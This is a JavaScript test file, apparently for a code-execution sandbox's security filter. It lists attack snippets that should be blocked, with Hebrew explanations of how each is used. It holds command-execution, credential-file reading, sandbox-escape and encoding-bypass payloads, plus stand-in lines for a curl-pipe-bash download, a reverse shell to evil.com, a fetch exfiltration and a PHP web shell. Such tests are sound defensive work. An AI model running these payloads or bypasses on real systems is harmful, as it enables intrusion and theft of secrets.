/**
 * JavaScript Security Attack Vectors
 * 
 * Educational test cases demonstrating common attack patterns
 * that malicious users might attempt in a web-based code execution environment.
 * 
 * Each test includes:
 * - name: Test identifier
 * - code: The malicious code attempt
 * - expectBlocked: Whether this should be blocked (true) or allowed (false)
 * - category: Attack category for grouping
 * - explanation: Human-readable description of how hackers use this attack
 */

export const javascriptTests = [
  // ════════════════════════════════════════════════════════════════
  // COMMAND EXECUTION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: child_process require',
    code: `const { exec } = require('child_process'); exec('whoami', (err, stdout) => console.log(stdout));`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `      
      🎯 התקפה: הרצת פקודות Shell דרך child_process

      איך האקרים משתמשים בזה:
      תוקפים מייבאים את מודול child_process של Node.js כדי להריץ פקודות Shell שרירותיות
      על השרת. זו הדרך הישירה ביותר להגיע ל-Remote Code Execution (RCE).

      השפעה בעולם האמיתי:
      - הרצת rm -rf / כדי למחוק את כל קבצי השרת
      - הרצת cat /etc/passwd כדי לגנוב פרטי משתמשים
      - התקנת דלתות אחוריות, כורי קריפטו או כופרה
      - מעבר לתקיפת מערכות אחרות בתוך הרשת

      דוגמה לשרשרת תקיפה:
      1. exec('curl http://evil.com/backdoor.sh | bash')
      2. השרת מוריד ומריץ את הסקריפט של התוקף
      3. התוקף מקבל גישה מתמשכת לשרת
    `,
  },
  {
    name: 'JS: child_process import',
    code: `import { exec } from 'child_process'; exec('ls -la');`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `      
      🎯 התקפה: ייבוא ES Module של child_process

      איך האקרים משתמשים בזה:
      זהה ל-require(), אבל באמצעות תחביר ES module מודרני. תוקפים מנסים גם
      CommonJS עם require וגם ESM עם import כדי לעקוף מסננים שבודקים רק סגנון אחד.

      השפעה בעולם האמיתי:
      - הצגת כל הקבצים כדי למצוא קונפיגורציות רגישות
      - מיפוי מבנה התיקיות של השרת להמשך התקפה
      - זיהוי תוכנות וגרסאות מותקנות לצורך ניצול ממוקד
    `,
  },
  {
    name: 'JS: spawn command',
    code: `import { spawn } from 'child_process'; spawn('cat', ['/etc/passwd']);`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `      
      🎯 התקפה: יצירת תהליך עם ארגומנטים

      איך האקרים משתמשים בזה:
      spawn() מאפשר להעביר ארגומנטים לפקודה כמערך, מה שיכול לעקוף
      מסננים שמחפשים מחרוזות פקודה. הוא גם מתאים יותר לתהליכים שרצים לאורך זמן.

      השפעה בעולם האמיתי:
      - יצירת reverse shell: spawn('bash', ['-c', 'bash -i >& /dev/tcp/evil.com/4444 0>&1'])
      - הרצת תהליכי רקע שממשיכים לפעול אחרי שהסקריפט הראשי מסתיים
      - הרצת קבצים בינאריים עם שילובי ארגומנטים מורכבים
    `,
  },
  {
    name: 'JS: execSync command',
    code: `const { execSync } = require('child_process'); console.log(execSync('id').toString());`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `      
      🎯 התקפה: הרצת פקודה סינכרונית

      איך האקרים משתמשים בזה:
      execSync() חוסם את הריצה עד שהפקודה מסתיימת ומחזיר את הפלט ישירות.
      זה מקל על חילוץ מידע בביטוי אחד.

      השפעה בעולם האמיתי:
      - חילוץ מידע: execSync('cat /etc/shadow').toString()
      - בדיקת הרשאות משתמש: execSync('id') מציג אם התהליך רץ כ-root
      - אמין יותר מהרצה אסינכרונית כאשר התוקף צריך תוצאה מיידית
    `,
  },
  {
    name: 'JS: execFile command',
    code: `import { execFile } from 'child_process'; execFile('/bin/ls', ['-la'], (e, out) => console.log(out));`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `      
      🎯 התקפה: הרצת קובץ בינארי ישירות

      איך האקרים משתמשים בזה:
      execFile() מריץ קובץ בינארי מסוים בלי לעבור דרך Shell.
      זה יכול לעקוף הגנות שמבוססות על Shell וקשה יותר לזיהוי.

      השפעה בעולם האמיתי:
      - הרצת נוזקה מקומפלת ישירות
      - הרצת כלי מערכת בלי לוגים של Shell
      - הימנעות מבעיות escaping של Shell לצורך ניצול יציב יותר
    `,
  },
  {
    name: 'JS: fork process',
    code: `import { fork } from 'child_process'; fork('./malicious.js');`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `      
      🎯 התקפה: פיצול תהליכי Node.js

      איך האקרים משתמשים בזה:
      fork() יוצר תהליך Node.js חדש שיכול לתקשר עם תהליך האב.
      תוקפים משתמשים בזה כדי להריץ נוזקה מתמשכת ברקע.

      השפעה בעולם האמיתי:
      - הרצת כורי קריפטו בתהליכים מפוצלים
      - יצירת רשת תהליכים להתקפות מבוזרות
      - שמירה על התמדה גם אם התהליך הראשי נהרג
    `,
  },
  {
    name: 'JS: Dynamic require bypass',
    code: `const m = 'child_' + 'process'; const cp = require(m); cp.exec('whoami');`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `      
      🎯 התקפה: עקיפת מסננים באמצעות חיבור מחרוזות

      איך האקרים משתמשים בזה:
      באמצעות פיצול שמות מודולים מסוכנים לחלקים, תוקפים מנסים להתחמק
      ממסנני אבטחה מבוססי תבניות שמחפשים מחרוזות מדויקות.

      השפעה בעולם האמיתי:
      - עקיפת מסנני regex פשוטים: 'child' + '_process' לא נראה כמו 'child_process' למסנן נאיבי
      - לכן צריך לחסום כל require דינמי, לא רק שמות מודולים ספציפיים
      - מאלץ את האבטחה לחשוב על ניתוח סמנטי, לא רק על התאמת מחרוזות
    `,
  },
  {
    name: 'JS: String concatenation bypass',
    code: `const name = ['child', '_', 'process'].join(''); require(name).exec('id');`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `      
      🎯 התקפה: עקיפת מסננים באמצעות Array.join

      איך האקרים משתמשים בזה:
      שימוש בפעולות מערך כדי לבנות שמות מודולים בזמן ריצה,
      מה שהופך ניתוח סטטי לכמעט בלתי אפשרי.

      השפעה בעולם האמיתי:
      - מתוחכם יותר מחיבור מחרוזות פשוט
      - ניתן לשילוב עם קידוד כדי לטשטש עוד יותר
      - מדגים למה allowlist עדיף על blocklist
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // FILE SYSTEM ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: fs module import',
    code: `import * as fs from 'fs'; console.log(fs.readFileSync('/etc/passwd', 'utf8'));`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `      
      🎯 התקפה: גישה למערכת הקבצים דרך מודול fs

      איך האקרים משתמשים בזה:
      מודול fs מספק גישה מלאה למערכת הקבצים. תוקפים משתמשים בו כדי
      לקרוא קבצים רגישים, לכתוב נוזקות או לשנות קונפיגורציות.

      השפעה בעולם האמיתי:
      - קריאת /etc/passwd ו-/etc/shadow לגניבת פרטי גישה
      - קריאת קבצי .env שמכילים API keys וסיסמאות למסדי נתונים
      - שינוי קוד האפליקציה כדי להזריק דלתות אחוריות
      - קריאת מפתחות SSH פרטיים לצורך תנועה רוחבית
    `,
  },
  {
    name: 'JS: fs/promises import',
    code: `import { readFile } from 'fs/promises'; const data = await readFile('/etc/passwd');`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `      
      🎯 התקפה: גישה לקבצים מבוססת Promises

      איך האקרים משתמשים בזה:
      fs/promises הוא ה-API האסינכרוני המודרני לפעולות קבצים. תוקפים משתמשים בו
      כאשר await/async זמין, דבר שנפוץ ב-Node.js מודרני.

      השפעה בעולם האמיתי:
      - אותה יכולת כמו fs, אבל עם קוד אסינכרוני נקי יותר
      - לעיתים נשכח במסננים שבודקים רק fs
      - חלק מאסטרטגיית חסימה מקיפה של fs
    `,
  },
  {
    name: 'JS: fs writeFile',
    code: `import { writeFileSync } from 'fs'; writeFileSync('/tmp/backdoor.js', 'malicious code');`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `      
      🎯 התקפה: כתיבת קבצים זדוניים

      איך האקרים משתמשים בזה:
      כתיבת קבצים מאפשרת התקפות מתמשכות - נוזקה ששורדת אתחולים,
      web shells להמשך גישה או שינויי קונפיגורציה.

      השפעה בעולם האמיתי:
      - כתיבת web shells: writeFileSync('/var/www/shell.php', '<?php system($_GET["cmd"]); ?>')
      - שינוי cron jobs לצורך התמדה
      - החלפת קוד לגיטימי בגרסאות טרויאניות
      - יצירת SSH authorized_keys לגישה אחורית
    `,
  },
  {
    name: 'JS: fs require',
    code: `const fs = require('fs'); fs.readdirSync('/').forEach(f => console.log(f));`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `      
      🎯 התקפה: סריקת תיקיות

      איך האקרים משתמשים בזה:
      הצגת תיקיות עוזרת לתוקפים להבין את מבנה המערכת,
      למצוא קבצים רגישים ולתכנן התקפות נוספות.

      השפעה בעולם האמיתי:
      - מיפוי מבנה האפליקציה כדי למצוא קבצי קונפיגורציה
      - גילוי קבצי גיבוי עם סיסמאות
      - מציאת קבצי לוג עם מידע רגיש
      - איתור תיקיות בית של משתמשים אחרים
    `,
  },
  {
    name: 'JS: node:fs import',
    code: `import fs from 'node:fs'; fs.readFileSync('/root/.ssh/id_rsa');`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `      
      🎯 התקפה: עקיפת ייבוא באמצעות פרוטוקול node:

      איך האקרים משתמשים בזה:
      הקידומת node: היא דרך חלופית לייבא מודולים מובנים.
      תוקפים מנסים זאת כאשר ייבוא רגיל נחסם.

      השפעה בעולם האמיתי:
      - גניבת מפתחות SSH פרטיים לצורך גישה לשרת
      - אותן יכולות כמו fs רגיל, דרך נתיב ייבוא אחר
      - בדיקת היסודיות של חסימת import
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // NETWORK ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: http module',
    code: `const http = require('http'); http.get('http://evil.com/steal?data=secret');`,
    expectBlocked: true,
    category: 'network',
    explanation: `      
      🎯 התקפה: חילוץ מידע דרך HTTP

      איך האקרים משתמשים בזה:
      גישה לרשת מאפשרת לתוקפים לשלוח מידע גנוב לשרתים חיצוניים
      או להוריד payloads נוספים של נוזקה.

      השפעה בעולם האמיתי:
      - חילוץ פרטי גישה, tokens או מידע רגיש
      - הורדת נוזקה בשלב שני
      - התחברות לשרתי Command & Control (C2)
      - תקיפת מערכות אחרות
    `,
  },
  {
    name: 'JS: https module',
    code: `const https = require('https'); https.get('https://evil.com/beacon');`,
    expectBlocked: true,
    category: 'network',
    explanation: `      
      🎯 התקפה: חילוץ מידע מוצפן

      איך האקרים משתמשים בזה:
      HTTPS מקשה על זיהוי חילוץ מידע כי התעבורה מוצפנת.
      כלי אבטחה לא יכולים לבדוק את התוכן בלי SSL interception.

      השפעה בעולם האמיתי:
      - התחמקות מניטור אבטחה ברמת הרשת
      - התחזות לתעבורת HTTPS לגיטימית
      - קשה יותר להבדיל מפניות API רגילות
    `,
  },
  {
    name: 'JS: net module',
    code: `const net = require('net'); net.connect(4444, 'evil.com');`,
    expectBlocked: true,
    category: 'network',
    explanation: `      
      🎯 התקפה: חיבור TCP גולמי, Reverse Shell

      איך האקרים משתמשים בזה:
      מודול net מספק גישה ל-sockets גולמיים, ומשמש לעיתים קרובות ליצירת
      reverse shells שמתחברים חזרה לשרת בשליטת התוקף.

      השפעה בעולם האמיתי:
      - יצירת reverse shells לגישה אינטראקטיבית
      - עקיפת חומות אש שמסננות רק חיבורים נכנסים
      - יצירת ערוצים סמויים לחילוץ מידע
      - סריקת פורטים ומודיעין רשת
    `,
  },
  {
    name: 'JS: dgram (UDP)',
    code: `const dgram = require('dgram'); const s = dgram.createSocket('udp4');`,
    expectBlocked: true,
    category: 'network',
    explanation: `      
      🎯 התקפה: תקשורת מבוססת UDP

      איך האקרים משתמשים בזה:
      UDP יכול לעקוף חלק מחומות האש וכלי הניטור שמתמקדים ב-TCP.
      הוא משמש ל-DNS exfiltration ולערוצים סמויים.

      השפעה בעולם האמיתי:
      - DNS tunneling לחילוץ מידע
      - השתתפות בהתקפות DDoS amplification
      - תקשורת סמויה שמתחמקת מניטור TCP
    `,
  },
  {
    name: 'JS: fetch API',
    code: `fetch('https://evil.com/collect', { method: 'POST', body: JSON.stringify(secrets) });`,
    expectBlocked: true,
    category: 'network',
    explanation: `      
      🎯 התקפה: חילוץ מידע HTTP מודרני

      איך האקרים משתמשים בזה:
      fetch() היא הדרך המודרנית לבצע בקשות HTTP. תוקפים משתמשים בה כדי
      לשלוח מידע גנוב לשרתים חיצוניים עם מעט מאוד קוד.

      השפעה בעולם האמיתי:
      - שליחת payloads מסוג JSON עם מידע גנוב
      - קריאות API לתשתית של התוקף
      - תחביר נקי יותר ממודול http, ולעיתים מתפספס במסננים
    `,
  },
  {
    name: 'JS: WebSocket',
    code: `const ws = new WebSocket('wss://evil.com/shell'); ws.onopen = () => ws.send('connected');`,
    expectBlocked: true,
    category: 'network',
    explanation: `      
      🎯 התקפה: חיבור WebSocket מתמשך

      איך האקרים משתמשים בזה:
      WebSockets מספקים חיבור דו-כיווני ומתמשך - מושלם עבור
      remote shells אינטראקטיביים והזרמת מידע בזמן אמת.

      השפעה בעולם האמיתי:
      - reverse shells אינטראקטיביים עם latency נמוך
      - חילוץ בזמן אמת של הקשות מקלדת או מידע
      - חיבור מתמשך ששורד טעינות מחדש של עמוד
      - קשה יותר לזיהוי מבקשות HTTP חוזרות
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SYSTEM ACCESS ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: process.env access',
    code: `console.log(process.env);`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `      
      🎯 התקפה: גניבת משתני סביבה

      איך האקרים משתמשים בזה:
      משתני סביבה מכילים לעיתים קרובות קונפיגורציה רגישה כמו
      API keys, סיסמאות למסדי נתונים ו-secret tokens.

      השפעה בעולם האמיתי:
      - גניבת AWS_SECRET_ACCESS_KEY להשתלטות על חשבון ענן
      - קבלת DATABASE_URL עם פרטי גישה
      - מציאת JWT_SECRET כדי לזייף אסימוני אימות
      - גישה ל-STRIPE_SECRET_KEY לצורך הונאה פיננסית
    `,
  },
  {
    name: 'JS: process.exit',
    code: `process.exit(1);`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `      
      🎯 התקפה: מניעת שירות (DoS)

      איך האקרים משתמשים בזה:
      סיום התהליך גורם לשיבוש השירות. בסביבה משותפת,
      זה משפיע על כל המשתמשים.

      השפעה בעולם האמיתי:
      - קריסת השרת וגרימת downtime
      - שיבוש השירות למשתמשים לגיטימיים
      - חלק מהתקפות סחיטה או כופר
      - טשטוש עקבות באמצעות קריסה לפני רישום לוגים
    `,
  },
  {
    name: 'JS: process.kill',
    code: `process.kill(process.pid, 'SIGKILL');`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `      
      🎯 התקפה: סיום תהליך

      איך האקרים משתמשים בזה:
      שליחת signals לתהליכים יכולה לסיים אותם או לשנות את ההתנהגות שלהם.
      SIGKILL לא ניתן לתפיסה או להתעלמות.

      השפעה בעולם האמיתי:
      - הריגת תהליך האפליקציה
      - הריגת תהליכים אחרים במערכת, אם ההרשאות מאפשרות
      - שיבוש שירותים קשורים
    `,
  },
  {
    name: 'JS: process.cwd',
    code: `console.log(process.cwd());`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `      
      🎯 התקפה: חשיפת נתיב

      איך האקרים משתמשים בזה:
      ידיעת תיקיית העבודה הנוכחית עוזרת לתוקפים להבין
      את מבנה האפליקציה ולתכנן התקפות path traversal.

      השפעה בעולם האמיתי:
      - חשיפת מבנה הקבצים של השרת
      - עזרה בבניית התקפות path traversal
      - איסוף מידע לצורך ניצול ממוקד
    `,
  },
  {
    name: 'JS: os module',
    code: `const os = require('os'); console.log(os.hostname(), os.userInfo());`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `      
      🎯 התקפה: איסוף מידע על המערכת

      איך האקרים משתמשים בזה:
      מודול os חושף פרטי מערכת שימושיים ל-fingerprinting
      ולתכנון התקפות ממוקדות.

      השפעה בעולם האמיתי:
      - קבלת hostname למיפוי רשת
      - מציאת שם המשתמש שמריץ את התהליך
      - זיהוי גרסת מערכת הפעלה לצורך ניצול ממוקד
      - מדידת זיכרון זמין להתקפות משאבים
    `,
  },
  {
    name: 'JS: cluster module',
    code: `const cluster = require('cluster'); if (cluster.isMaster) cluster.fork();`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `      
      🎯 התקפה: הכפלת תהליכים, Fork Bomb

      איך האקרים משתמשים בזה:
      מודול cluster יכול ליצור תהליכים מרובים, ובכך
      ליצור fork bomb שמרוקן משאבי מערכת.

      השפעה בעולם האמיתי:
      - מניעת שירות באמצעות מיצוי משאבים
      - קריסת כל השרת
      - פגיעה באפליקציות אחרות באחסון משותף
    `,
  },
  {
    name: 'JS: worker_threads',
    code: `const { Worker } = require('worker_threads'); new Worker('./evil.js');`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `      
      🎯 התקפה: הרצת Thread ברקע

      איך האקרים משתמשים בזה:
      Worker threads רצים במקביל ויכולים להריץ קוד זדוני
      באופן עצמאי מה-thread הראשי.

      השפעה בעולם האמיתי:
      - הרצת התקפות עתירות CPU כמו cryptomining
      - הרצת קוד ששורד סיום של ה-thread הראשי
      - עיבוד מקבילי לגניבת מידע מהירה יותר
    `,
  },
  {
    name: 'JS: vm module',
    code: `const vm = require('vm'); vm.runInNewContext('process.exit()');`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `      
      🎯 התקפה: בריחה מ-VM Sandbox

      איך האקרים משתמשים בזה:
      מודול vm יוצר הקשרים שנראים מבודדים, אבל הם אינם sandbox מאובטח.
      תוקפים יכולים לברוח מהם ולהגיע להקשר הראשי.

      השפעה בעולם האמיתי:
      - עקיפת sandboxing מתוכנן
      - גישה לאובייקטים גלובליים מתוך הקשר "מבודד"
      - הרצת קוד שרירותי עם הרשאות מלאות
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // CODE INJECTION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: eval execution',
    code: `eval("require('child_process').exec('whoami')");`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `      
      🎯 התקפה: הרצת קוד דינמית דרך eval()

      איך האקרים משתמשים בזה:
      eval() מריץ מחרוזות JavaScript שרירותיות. תוקפים משתמשים בו כדי
      לבנות ולהריץ קוד זדוני באופן דינמי.

      השפעה בעולם האמיתי:
      - הרצת קוד זדוני מטושטש
      - עקיפת ניתוח קוד סטטי
      - שילוב עם קידוד כדי להתחמק מזיהוי
      - בעיית האבטחה הקלאסית של "eval is evil"
    `,
  },
  {
    name: 'JS: Function constructor',
    code: `const fn = new Function("return require('fs').readFileSync('/etc/passwd')"); fn();`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `      
      🎯 התקפה: יצירת קוד דרך Function Constructor

      איך האקרים משתמשים בזה:
      Function constructor הוא eval() בתחפושת. הוא יוצר פונקציות חדשות
      מתוך מחרוזות, ולכן מאפשר הרצת קוד דינמית.

      השפעה בעולם האמיתי:
      - לעיתים מתפספס במסננים שחוסמים רק eval()
      - יכול לבנות ולהריץ כל JavaScript
      - עקיפת CSP שחוסם eval אבל לא Function
    `,
  },
  {
    name: 'JS: Dynamic import',
    code: `const module = await import('child_' + 'process'); module.exec('whoami');`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `      
      🎯 התקפה: טעינת מודולים בזמן ריצה

      איך האקרים משתמשים בזה:
      import() דינמי מאפשר לטעון מודולים בזמן ריצה עם שמות מחושבים,
      וכך לעקוף ניתוח סטטי והגבלות import.

      השפעה בעולם האמיתי:
      - טעינת מודולים מסוכנים עם שמות מטושטשים
      - טעינה מותנית כדי להתחמק מזיהוי
      - ייבוא מכתובות URL חיצוניות בחלק מהסביבות
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // MEMORY/BUFFER ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: Buffer.allocUnsafe',
    code: `const buf = Buffer.allocUnsafe(1000); console.log(buf.toString());`,
    expectBlocked: true,
    category: 'memory_access',
    explanation: `      
      🎯 התקפה: חשיפת מידע מזיכרון

      איך האקרים משתמשים בזה:
      Buffer.allocUnsafe() לא מאתחל את הזיכרון, ולכן עלול לחשוף
      מידע מהקצאות קודמות, כמו סיסמאות, מפתחות ועוד.

      השפעה בעולם האמיתי:
      - קריאת מידע רגיש מזיכרון לא מאותחל
      - חשיפת מידע בסגנון Heartbleed
      - חילוץ מפתחות קריפטוגרפיים או סיסמאות
      - Memory forensics בלי גישה ישירה
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // ENCODING BYPASS ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: String.fromCharCode bypass',
    code: `const cmd = String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115); require(cmd);`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `      
      🎯 התקפה: טשטוש באמצעות קודי תווים

      איך האקרים משתמשים בזה:
      המרת מחרוזות אל קודי תווים ומהם מסתירה שמות מודולים זדוניים
      ממסננים מבוססי תבניות.

      השפעה בעולם האמיתי:
      - child_process כקודי תווים: 99,104,105,108,100,95...
      - עקיפת התאמת מחרוזות פשוטה
      - נפוץ בנוזקות וב-exploit kits
      - לכן חוסמים גם את פונקציות הקידוד עצמן
    `,
  },
  {
    name: 'JS: atob base64 bypass',
    code: `const mod = atob('Y2hpbGRfcHJvY2Vzcw=='); require(mod).exec('id');`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `      
      🎯 התקפה: Payload מקודד Base64

      איך האקרים משתמשים בזה:
      קידוד Base64 משמש רבות להסתרת מחרוזות זדוניות.
      Y2hpbGRfcHJvY2Vzcw== מפוענח ל-child_process.

      השפעה בעולם האמיתי:
      - הסתרת קוד זדוני בתוך מחרוזות שנראות אקראיות
      - עקיפת WAFs ומסננים מבוססי תבניות
      - טכניקה סטנדרטית בניצול חולשות Web
      - לעיתים משולבת עם שכבות קידוד נוספות
    `,
  },
  {
    name: 'JS: Buffer.from decode bypass',
    code: `const mod = Buffer.from('6368696c645f70726f63657373', 'hex').toString(); require(mod);`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `      
      🎯 התקפה: שם מודול מקודד Hex

      איך האקרים משתמשים בזה:
      קידוד Hex ממיר מחרוזות לייצוג הקסדצימלי, וכך עוקף מסננים מבוססי מחרוזות.
      6368696c645f70726f63657373 הוא child_process ב-Hex.

      השפעה בעולם האמיתי:
      - חלופה ל-Base64 לצורך טשטוש
      - יכול לעקוף מסננים שחוסמים Base64 אבל לא Hex
      - נפוץ בפיתוח exploits
    `,
  },
  {
    name: 'JS: Unicode escape bypass',
    code: `const p = '\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073'; console.log(global[p].env);`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `      
      🎯 התקפה: רצפי Unicode Escape

      איך האקרים משתמשים בזה:
      JavaScript תומך ב-unicode escapes בתוך מחרוזות. הרצף
      \u0070\u0072\u006f\u0063\u0065\u0073\u0073 הוא process, ומשמש לגישה אל global.process.env.

      השפעה בעולם האמיתי:
      - עקיפת מסנני מילות מפתח
      - גישה למאפיינים חסומים באמצעות bracket notation
      - JavaScript חוקי שנראה כמו גיבוב חסר משמעות
    `,
  },
  {
    name: 'JS: Hex escape bypass',
    code: `const x = '\\x70\\x72\\x6f\\x63\\x65\\x73\\x73'; console.log(global[x].env);`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `      
      🎯 התקפה: Hex Character Escapes

      איך האקרים משתמשים בזה:
      בדומה ל-unicode escapes, גם hex escapes מסתירים תוכן של מחרוזות.
      \x70\x72\x6f\x63\x65\x73\x73 הוא process.

      השפעה בעולם האמיתי:
      - קצר יותר מ-unicode escapes
      - יעיל באותה מידה לעקיפת מסננים
      - נפוץ ב-JavaScript obfuscators
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // PROTOTYPE POLLUTION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: __proto__ pollution',
    code: `({}).__proto__.polluted = 'pwned'; console.log({}.polluted);`,
    expectBlocked: true,
    category: 'prototype_pollution',
    explanation: `      
      🎯 התקפה: Prototype Pollution דרך __proto__

      איך האקרים משתמשים בזה:
      שינוי Object.prototype משפיע על כל האובייקטים באפליקציה.
      זה עלול להוביל להסלמת הרשאות, RCE או DoS.

      השפעה בעולם האמיתי:
      - הוספת מאפיינים זדוניים לכל האובייקטים
      - עקיפת בדיקות אבטחה: if(obj.isAdmin) הופך ל-true עבור כולם
      - יכול להוביל ל-RCE בחלק מה-frameworks
      - CVE-2019-11358 ב-jQuery, CVE-2020-8203 ב-Lodash
    `,
  },
  {
    name: 'JS: Object.setPrototypeOf pollution',
    code: `Object.setPrototypeOf({}, { exec: () => 'pwned' });`,
    expectBlocked: true,
    category: 'prototype_pollution',
    explanation: `      
      🎯 התקפה: מניפולציה על Prototype דרך setPrototypeOf

      איך האקרים משתמשים בזה:
      setPrototypeOf יכול לשנות את שרשרת ה-prototype של אובייקט ולהזריק
      מתודות זדוניות שנראות כאילו עברו בירושה.

      השפעה בעולם האמיתי:
      - הזרקת מתודות זדוניות לאובייקטים
      - שינוי התנהגות של טיפוסים מובנים
      - עקיפת בדיקות instanceof
    `,
  },
  {
    name: 'JS: constructor.prototype pollution',
    code: `const obj = {}; obj.constructor.prototype.polluted = true;`,
    expectBlocked: true,
    category: 'prototype_pollution',
    explanation: `      
      🎯 התקפה: Prototype Pollution דרך constructor

      איך האקרים משתמשים בזה:
      גישה ל-prototype דרך constructor היא וקטור נוסף לזיהום prototype,
      שעשוי לעקוף מסננים שבודקים רק __proto__.

      השפעה בעולם האמיתי:
      - נתיב חלופי ל-prototype pollution
      - משפיע על כל האובייקטים שחולקים את אותו prototype
      - יכול להשחית את מצב האפליקציה באופן גלובלי
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // GLOBAL OBJECT ACCESS ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: globalThis access',
    code: `console.log(globalThis.process.env);`,
    expectBlocked: true,
    category: 'global_access',
    explanation: `      
      🎯 התקפה: גישה למשתני סביבה דרך globalThis

      איך האקרים משתמשים בזה:
      globalThis הוא הדרך התקנית לגשת לאובייקט הגלובלי בכל
      סביבת JavaScript. ב-Node.js הוא מאפשר גישה ל-process.

      השפעה בעולם האמיתי:
      - גישה ל-process.env לצורך גניבת credentials
      - הגעה לכל אובייקט או פונקציה גלובליים
      - עובד גם בדפדפן וגם ב-Node.js
    `,
  },
  {
    name: 'JS: global access',
    code: `console.log(global.process.mainModule.require('child_process'));`,
    expectBlocked: true,
    category: 'global_access',
    explanation: `      
      🎯 התקפה: שרשרת אובייקט גלובלי של Node.js

      איך האקרים משתמשים בזה:
      שרשרת global.process.mainModule.require יכולה לשמש כדי להגיע ל-require()
      גם כאשר הוא לא זמין ישירות.

      השפעה בעולם האמיתי:
      - עקיפת sandboxes שמסתירים את require()
      - גישה למודולים מסוכנים דרך שרשרת ה-prototype
      - טכניקת בריחה קלאסית מ-VM
    `,
  },
  {
    name: 'JS: this.constructor escape',
    code: `const p = this.constructor.constructor('return process')(); console.log(p.env);`,
    expectBlocked: true,
    category: 'global_access',
    explanation: `      
      🎯 התקפה: בריחה מ-Sandbox דרך שרשרת Constructor

      איך האקרים משתמשים בזה:
      this.constructor.constructor הוא Function constructor. הוא יכול
      ליצור פונקציות שמחזירות אובייקטים גלובליים וכך לברוח מ-sandboxes.

      השפעה בעולם האמיתי:
      - בריחה מ-vm2, safeeval וכלים דומים
      - גישה ל-process גם בהקשרים "מוגבלים"
      - טכניקה מוכרת בתחרויות CTF
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // REFLECT/PROXY ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: Reflect.get bypass',
    code: `const p = Reflect.get(global, 'process'); console.log(p.env);`,
    expectBlocked: true,
    category: 'reflect_proxy',
    explanation: `      
      🎯 התקפה: גישה למאפיינים באמצעות Reflection

      איך האקרים משתמשים בזה:
      Reflect API מספק דרך חלופית לגשת למאפייני אובייקטים,
      ועשוי לעקוף hooks של גישה למאפיינים.

      השפעה בעולם האמיתי:
      - עקיפת sandboxes מבוססי Proxy
      - גישה למאפיינים דרך reflection
      - חלופה לגישה ישירה למאפיינים
    `,
  },
  {
    name: 'JS: Proxy trap',
    code: `new Proxy({}, { get: () => require('fs') });`,
    expectBlocked: true,
    category: 'reflect_proxy',
    explanation: `      
      🎯 התקפה: Proxy Trap להרצת קוד

      איך האקרים משתמשים בזה:
      Proxies יכולים ליירט גישה למאפיינים ולהריץ קוד שרירותי.
      פונקציות ה-handler יכולות להכיל payloads זדוניים.

      השפעה בעולם האמיתי:
      - הרצת קוד כאשר ניגשים למאפיינים
      - הסתרת התנהגות זדונית בתוך proxy handlers
      - יצירת אובייקטים עם תופעות לוואי מסוכנות
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // TIMER ABUSE ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: setTimeout eval',
    code: `setTimeout("require('child_process').exec('id')", 0);`,
    expectBlocked: true,
    category: 'timer_abuse',
    explanation: `      
      🎯 התקפה: הרצת קוד מושהית דרך setTimeout

      איך האקרים משתמשים בזה:
      setTimeout עם ארגומנט מחרוזת מתנהג כמו eval(), ומריץ
      את המחרוזת כקוד לאחר השהיה.

      השפעה בעולם האמיתי:
      - הרצה מושהית כדי להתחמק מניטור בזמן אמת
      - הרצת קוד אחרי שבדיקות אבטחה הסתיימו
      - מקבילה ישנה ל-eval שלעיתים מתפספסת
    `,
  },
  {
    name: 'JS: setInterval abuse',
    code: `setInterval(() => { throw new Error('DoS'); }, 1);`,
    expectBlocked: true,
    category: 'timer_abuse',
